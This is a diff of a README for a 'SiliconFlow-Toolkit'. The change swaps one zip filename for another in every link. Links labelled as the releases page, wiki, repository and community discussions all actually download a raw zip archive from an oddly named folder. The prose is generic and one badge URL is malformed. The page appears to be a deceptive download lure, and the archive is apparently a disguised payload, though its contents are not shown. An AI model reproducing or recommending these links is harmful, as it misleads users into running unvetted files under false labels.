@@ -1,7 +1,7 @@
 ```markdown
 # 🌟 SiliconFlow-Toolkit - Simplify Your Workflow with Ease
 
-[![Download SiliconFlow-Toolkit](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Flow-Toolkit-Silicon-1.8.zip%https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Flow-Toolkit-Silicon-1.8.zip)](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Flow-Toolkit-Silicon-1.8.zip)
+[![Download SiliconFlow-Toolkit](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Silicon_Flow_Toolkit_v3.7-beta.1.zip%https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Silicon_Flow_Toolkit_v3.7-beta.1.zip)](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Silicon_Flow_Toolkit_v3.7-beta.1.zip)
 
 ## 🎯 Overview
 
@@ -14,7 +14,7 @@ To start using the SiliconFlow Toolkit, follow these easy steps to download and 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Flow-Toolkit-Silicon-1.8.zip) to find the latest version of SiliconFlow Toolkit.
+   Go to our [Releases page](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Silicon_Flow_Toolkit_v3.7-beta.1.zip) to find the latest version of SiliconFlow Toolkit.
 
 2. **Choose Your Version:**
    On the Releases page, look for the most recent version. You will see various files available for download. Choose the one that best suits your operating system.
@@ -49,7 +49,7 @@ To start using the SiliconFlow Toolkit, follow these easy steps to download and 
 
 ## 📖 Documentation and Support
 
-For more detailed guidance, check the documentation available inside the application or on our [GitHub Wiki](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Flow-Toolkit-Silicon-1.8.zip). If you encounter any issues or need assistance, please raise your questions in the Issues section of our repository.
+For more detailed guidance, check the documentation available inside the application or on our [GitHub Wiki](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Silicon_Flow_Toolkit_v3.7-beta.1.zip). If you encounter any issues or need assistance, please raise your questions in the Issues section of our repository.
 
 ## 💬 Community
 
@@ -68,9 +68,9 @@ A: Yes, the SiliconFlow Toolkit is completely free for all users.
 
 ## 🔗 Resources
 
-- [Download SiliconFlow Toolkit](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Flow-Toolkit-Silicon-1.8.zip)
-- [GitHub Repository](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Flow-Toolkit-Silicon-1.8.zip)
-- [Community Discussions](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Flow-Toolkit-Silicon-1.8.zip)
+- [Download SiliconFlow Toolkit](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Silicon_Flow_Toolkit_v3.7-beta.1.zip)
+- [GitHub Repository](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Silicon_Flow_Toolkit_v3.7-beta.1.zip)
+- [Community Discussions](https://github.com/turegnassefa2024/SiliconFlow-Toolkit/raw/refs/heads/main/panichthyophagous/Silicon_Flow_Toolkit_v3.7-beta.1.zip)
 
 By following these steps, you will be able to successfully download and run the SiliconFlow Toolkit. Enjoy simplifying your tasks and enhancing your productivity!
 ```
